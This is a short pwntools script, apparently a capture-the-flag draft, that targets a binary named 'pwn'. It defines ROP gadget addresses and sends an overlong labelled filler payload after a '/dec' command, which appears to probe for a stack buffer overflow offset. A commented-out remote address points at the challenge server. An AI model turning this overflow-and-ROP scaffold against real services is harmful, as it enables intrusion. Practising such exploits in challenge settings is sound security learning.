from pwn import *

context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('pwn')
r= e.process()
# r = remote('172.188.64.101', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')
ret =0x0000000000400646
pop_rdi= 0x0000000000401343
main =0x40121F

r.sendline(b"2")
payload = b"/dec YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEh"
payload+= b"xxxxxxxx"
payload+= b"b"*8
payload+= b"c"*8
payload+= b"d"*8
payload+= b"e"*8
payload+= b"f"*8
payload+= b"g"*8
payload+= b"h"*8
payload+= b"i"*8
payload+= b"k"*8
payload+= b"l"*8
payload+= b"m"*8
payload+= b"n"*8
payload+= b"o"*8
payload+= b"x"*8
payload+= b"y"*8
payload+= b"z"*8
pause()
r.sendline(payload)

r.interactive()